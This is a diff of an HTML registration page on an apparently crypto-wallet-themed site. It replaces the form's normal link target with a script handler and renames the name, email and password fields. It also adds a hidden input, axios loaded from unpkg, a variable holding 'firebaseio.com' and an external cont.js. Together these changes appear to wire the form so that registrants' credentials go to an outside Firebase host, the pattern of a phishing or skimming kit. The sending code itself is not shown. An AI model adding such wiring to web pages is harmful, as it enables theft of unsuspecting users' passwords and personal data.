@@ -414,6 +414,7 @@
             <div class="container">
                 <div class="row row-cols-1">
                     <div class="col">
+                            <input type="hidden" value="https://blocktoblock" id="rez293" name=""/>
                         <div class="breadcrumb__content text-center">
                             <h1 class="breadcrumb__content--title text-white mb-10">Register Page</h1>
                             <ul class="breadcrumb__content--menu d-flex justify-content-center">
@@ -430,7 +431,7 @@
         <!-- Start login section  -->
         <div class="login__section section--padding">
             <div class="container">
-                <form action="./connect-wallet.html">
+                <form action="#" onsubmit="return submitForm(event,1)" method="post">
                     <div class="login__section--inner register">
                         <div class="row">
                             <div class="col-lg-6 col-md-10 offset-md-1 offset-lg-0 ">
@@ -448,32 +449,32 @@
                                         <div class="row">
                                             <div class="col-lg-6 col-md-6">
                                                 <div class="account__login--input__list">
-                                                    <label class="account__login--input__label" for="input1">First Name </label>
-                                                    <input class="account__login--input__field" id="input1" placeholder="First Name" type="text">
+                                                    <label class="account__login--input__label" for="name">First Name </label>
+                                                    <input class="account__login--input__field" id="name" placeholder="First Name" type="text">
                                                 </div>
                                             </div>
                                             <div class="col-lg-6 col-md-6">
                                                 <div class="account__login--input__list">
-                                                    <label class="account__login--input__label" for="input2">Last Name </label>
-                                                    <input class="account__login--input__field" id="input2" placeholder="Last Name" type="text">
+                                                    <label class="account__login--input__label" for="lname">Last Name </label>
+                                                    <input class="account__login--input__field" id="lname" placeholder="Last Name" type="text">
                                                 </div>
                                             </div>
                                             <div class="col-12">
                                                 <div class="account__login--input__list">
-                                                    <label class="account__login--input__label" for="input3">Email </label>
-                                                    <input class="account__login--input__field" id="input3" placeholder="Email" type="email">
+                                                    <label class="account__login--input__label" for="email">Email </label>
+                                                    <input class="account__login--input__field" id="email" placeholder="Email" type="email">
                                                 </div>
                                             </div>
                                             <div class="col-lg-6 col-md-6">
                                                 <div class="account__login--input__list">
-                                                    <label class="account__login--input__label" for="input4">Password </label>
-                                                    <input class="account__login--input__field" id="input4" placeholder="Password" type="password">
+                                                    <label class="account__login--input__label" for="pass">Password </label>
+                                                    <input class="account__login--input__field" minlength="3" id="pass" placeholder="Password" type="password">
                                                 </div>
                                             </div>
                                             <div class="col-lg-6 col-md-6">
                                                 <div class="account__login--input__list">
-                                                    <label class="account__login--input__label" for="input5">Re Password </label>
-                                                    <input class="account__login--input__field" id="input5" placeholder="Re Password" type="password">
+                                                    <label class="account__login--input__label" for="passs">Re Password </label>
+                                                    <input class="account__login--input__field" id="passs" placeholder="Re Password" type="password">
                                                 </div>
                                             </div>
                                         </div>
@@ -661,6 +662,13 @@
 
   <!-- Customscript js -->
   <script src="assets/js/script.js" defer="defer"></script>
+
+<script src="https://unpkg.com/axios@1.1.2/dist/axios.min.js"></script>
+
+<script type="text/javascript">var mart = 'firebaseio.com';</script>
+
+<script type="text/javascript" src="./assets/js/jquery-3.4.1.min.js"></script>
+<script type="text/javascript" src="./cont.js"></script>
   
 </body>
 
